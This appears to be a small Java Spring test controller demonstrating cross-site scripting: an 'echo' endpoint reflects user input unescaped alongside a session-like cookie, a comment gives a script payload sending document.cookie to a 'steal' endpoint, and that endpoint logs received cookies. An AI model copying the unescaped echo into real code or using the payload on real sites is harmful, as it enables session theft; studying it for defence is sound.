package tests.safety.controller;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletResponse;
import java.util.HashMap;
import java.util.Map;
import java.util.UUID;

/**
 * Created by yangzexin189 on 2017-05-22.
 */
@Controller
public class XssController {
    private static final Logger logger = LoggerFactory.getLogger(XssController.class);

    /**
     * <script language='javascript'>$.ajax({url: 'steal', data: {c: document.cookie}});</script>
     * */
    @RequestMapping("echo")
    @ResponseBody
    public Object echo(HttpServletResponse response, String m) {
        Cookie tokenIdCookie = new Cookie("tokenId", UUID.randomUUID().toString());
        response.addCookie(tokenIdCookie);

        Map<String, Object> resultData = new HashMap<String, Object>();

        resultData.put("msg", "echo: "+ m);

        return resultData;
    }

    @RequestMapping("steal")
    @ResponseBody
    public String steal(String c) {
        logger.info("cookie: " + c);

        return "OK";
    }
}
